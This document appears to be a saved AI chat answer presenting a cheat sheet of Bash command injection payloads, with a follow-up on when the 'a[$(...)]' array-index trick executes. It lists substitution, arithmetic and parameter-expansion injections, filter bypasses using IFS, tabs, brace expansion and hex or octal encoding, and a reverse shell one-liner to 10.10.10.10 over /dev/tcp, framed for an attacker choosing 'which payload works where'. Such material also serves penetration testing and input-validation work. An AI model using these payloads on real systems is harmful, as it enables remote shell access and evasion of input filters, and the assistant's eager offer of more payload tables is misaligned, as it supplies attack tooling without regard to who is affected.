[[Eureka]] 


Perfect 👌 this is a **goldmine topic** because in Bash there are _many parsing contexts_ where an attacker can smuggle code execution.  
Here’s a structured **cheat sheet of command injection tricks in Bash** 🧨

---

## 🔹 1. Classic Substitution Tricks

These are the bread and butter:

- **Command substitution**
```sh
$(id)
`id`
```

- **Arithmetic expansion (forces command execution in `$(( ))`)**
```sh
$(( $(id) ))
```

- **Process substitution**
```sh
<(id)
>(id)
```

---

## 🔹 2. Array / Arithmetic Bypasses

These shine when the developer thinks only numbers are allowed.

- **Array index execution**
```sh
a[$(id)]
```

- **Arithmetic context execution**
```sh
$[ $(id) ]
```

---

## 🔹 3. String Injection Tricks

Useful when inside quotes or strings.

- **Concatenation with semicolons**
```sh
1; id
```

- **Newline as command separator**
```sh
1
id
```

- **Backticks inside quotes**
 ```sh
"foo$(id)"
'foo'"$(id)"
```

---

## 🔹 4. Variable Expansion Tricks

Sometimes devs filter only `$()` or `;`, but variables can help.
- **Indirect expansion**

 ```sh
${PATH}
${!USER*}
```

- **Force command execution inside parameter expansion**
```sh
${x:-$(id)}
${x:=$(id)}
 ```
    
---

## 🔹 5. File Redirection & Descriptors

Even if commands are limited, you can pivot to execution.
- **Redirection to TCP**
```sh
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```

- **Here-strings**
```sh
cat <<< $(id)
```


---
## 🔹 6. Built-in Abuse

Even "safe-looking" built-ins can execute.
- **eval** : If you can reach `eval`, it’s game over:
```sh
eval "id"
 ```
- **declare, export, typeset** (support command substitution)
```sh
declare x=$(id)
export y=$(id)
```
- **printf** with `%()` (bash >= 4.2)
```sh
printf '%s\n' $(( $(id) ))
```

---

## 🔹 7. Whitespace / Filter Bypasses

If spaces are blocked:
- **Tab instead of space**
```sh
id<tab>
```

- **Brace expansion**
```sh
{ls,-la}
```

- **IFS abuse**
```sh
IFS=,;`echo,ls`
```

---
## 🔹 8. Logic / Flow Tricks

If inside conditions or loops.
- **Condition bypass**
```sh
if [[ 1 -eq $(id) ]]; then :; fi
```
- **Case injection**
```sh
case $(id) in esac
```

---

## 🔹 9. Encodings & Obfuscation

When filters block obvious payloads.

- **Hex encoded commands**
 ```sh
$'\x69\x64'
```
- **Octal**
```sh
$'\151\144'
```
- **Unicode homoglyphs**  
    Replace `;` or `|` with visually similar symbols in permissive parsers.

---

## 🔹 10. Special Shell Features

- **$() inside $() recursion**
```sh
$(echo $(id))
```
- **Command name expansion**
```sh
 {id}
```

---

💡 **Key idea**: Most injections boil down to finding what context you’re in (string, arithmetic, array, eval, etc.), then choosing the expansion trick that Bash will evaluate **before syntax errors stop it**.

---

👉 Do you want me to build a **table of contexts (string, arithmetic, eval, array, etc.) vs. which tricks execute**? That way you’ll know exactly which payload works where.





---

### ⚠️ Will `a[$(...)]` work in _most_ command injections?

Not really. It depends **heavily on the vulnerable context**:

1. **Arithmetic / array contexts** ✅
    - If the injection point is inside `(( ... ))`, `[[ ... -eq ... ]]`, or something that interprets array indexing, then yes — `a[$(...)]` can bypass numeric-only expectations.
    - Example:
```bash
x=5
if [[ $x -eq a[$(id)] ]]; then echo hi; fi
```
2. **Plain command execution** (e.g. `eval "$code"`, `sh -c "$input"`) 🚫
	- In those cases, you don’t need the `a[...]` trick at all — `$(...)` alone will work fine.
3. **Quoted strings** (e.g. `"value='$code'"`) ⚠️
    - If the vulnerable spot is inside quotes or passed as an argument, then `a[$(...)]` might actually break things, because array syntax won’t be valid there.        
4. **Other shells** (dash, sh, zsh) 🤔
    - This trick is very **bash-specific**.
    - `dash` (used in Debian/Ubuntu for `/bin/sh`) doesn’t support arrays, so `a[...]` would fail before `$(...)` executes.
---

### ✅ When it _shines_

This trick is especially useful when:
- You’re injecting into a **numeric comparison** or arithmetic expression.
- The developer thinks only numbers will be allowed.
- Direct `$(...)` would cause parsing errors.
---

👉 So your intuition is right: it’s a **bypass technique** that works in certain command injection scenarios, but it’s **not universal**.

Would you like me to put together a **cheat sheet of contexts** (arithmetic, strings, eval, arrays) showing when `a[$(...)]` executes and when it fails? That way you’ll see exactly where it generalizes and where it doesn’t.